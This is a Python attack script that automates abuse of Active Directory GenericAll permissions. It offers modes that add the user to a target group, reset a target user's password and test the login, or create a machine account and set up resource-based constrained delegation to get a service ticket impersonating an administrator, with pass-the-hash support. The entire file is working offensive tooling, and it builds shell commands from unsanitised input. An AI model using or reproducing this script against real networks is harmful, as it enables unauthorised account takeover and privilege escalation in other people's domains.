import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")
# Get the arguments from the argument_parser.py
args = parse_arguments()
# Extract arguments
DOMAIN = args.DomainName
USER = args.Username
PASS = args.Password
HASH = args.PassTheHash  

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

def whois_GA():
    """Prompt user to choose between group (g) or user (u)"""
    who = input(f"{CYAN}Write owner over computer group or user (c/g/u):{RED} ").strip().lower()
    return who  # Return the input value

def GenericAllHashG():
    tar = input(f"{CYAN}Target:{RED} {RESET}")
    ip = input(f"{CYAN}DC IP:{RED} {RESET}")
    subprocess.call([f"pth-net rpc group addmem {tar} {USER} -U {DOMAIN}/{USER}%00000000000000000000000000000000:{HASH} -S {ip}"], shell=True)
    print (f"{YELLOW}User {USER} added to group {tar}{RESET}")

def GenericAllPassG():
    tar = input(f"{CYAN}Target:{RED} {RESET}")
    ip = input(f"{CYAN}DC IP:{RED} {RESET}")
    subprocess.call([f"net rpc group addmem {tar} {USER} -U {DOMAIN}/{USER}%{PASS} -S {ip}"], shell=True)
    print (f"{YELLOW}User {USER} added to group {tar}{RESET}")

def GenericAllHashC():
    tar = input(f"{CYAN}Target:{RED} {RESET}")
    DCNB = input(f"{CYAN}Net-Bios name (ex DC01):{RED} {RESET}")
    print(f"{YELLOW}Attempting to add computer OGC$ with pass P@ssw0rd123!@#{RESET}")
    subprocess.call([f"addcomputer.py -method LDAPS -computer-name 'OGC$' -computer-pass 'P@ssw0rd123!@#' -dc-host {DOMAIN} -domain-netbios {DCNB} '{DOMAIN}/{USER}' -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    print(f"{YELLOW}Attempting to allow delegation from OGC$ to {tar}")
    subprocess.call([f"rbcd.py -delegate-from 'OGC$' -delegate-to '{tar}' -action 'write' {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    print(f"{YELLOW}Attempting to retrieve ticket")
    imp = input(f"{CYAN}User to impersonate (ex: administrator):{RED} {RESET}")
    subprocess.call([f"getST.py -spn 'cifs/{DCNB}.{DOMAIN}' -impersonate {imp} {DOMAIN}/'OGC$:P@ssw0rd123!@#'"], shell=True)
    print(f"{YELLOW}If ticket was retrieved you can attempt to PTT at {tar}")

def GenericAllPassC():
    tar = input(f"{CYAN}Target:{RED} {RESET}")
    DCNB = input(f"{CYAN}Net-Bios name (ex DC01):{RED} {RESET}")
    print(f"{YELLOW}Attempting to add computer OGC$ with pass P@ssw0rd123!@#{RESET}")
    subprocess.call([f"addcomputer.py -method LDAPS -computer-name 'OGC$' -computer-pass 'P@ssw0rd123!@#' -dc-host {DOMAIN} -domain-netbios {DCNB} '{DOMAIN}/{USER}/{PASS}'"], shell=True)
    print(f"{YELLOW}Attempting to allow delegation from OGC$ to {tar}")
    subprocess.call([f"rbcd.py -delegate-from 'OGC$' -delegate-to '{tar}' -action 'write' {DOMAIN}/{USER}:{PASS}"], shell=True)
    print(f"{YELLOW}Attempting to retrieve ticket")
    imp = input(f"{CYAN}User to impersonate (ex: administrator):{RED} {RESET}")
    subprocess.call([f"getST.py -spn 'cifs/{DCNB}.{DOMAIN}' -impersonate {imp} {DOMAIN}/'OGC$:P@ssw0rd123!@#'"], shell=True)
    print(f"{YELLOW}If ticket was retrieved you can attempt to PTT at {tar}")

def GenericAllHash():
    tar = input(f"{CYAN}Target:{RED} {RESET}")
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    subprocess.call([f"pth-net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{HASH} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)
    
def GenericAllPass():
    tar = input(f"{CYAN}Target:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
    subprocess.call([f"net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)
def main():

    # Capture the input from whois function
    who_choice = whois_GA()  # Get user input and store it in a variable

    # Check if the user input is valid
    if who_choice not in ['g', 'c', 'u']:
        print(f"{RED}Invalid input! Please choose 'g' 'c' or 'u'.")
        return  # Exit the program if input is invalid

    # Execute the appropriate function based on the parsed arguments
    if HASH:
        if who_choice == "c":
            GenericAllHashC()
        elif who_choice == "u":
            GenericAllHash()
        else:
            GenericAllHashG()
    else:
        if who_choice == "c":
            GenericAllPassC()
        elif who_choice == "u":
            GenericAllPass()
        else:
            GenericAllPassG()

if __name__ == '__main__':
    main()
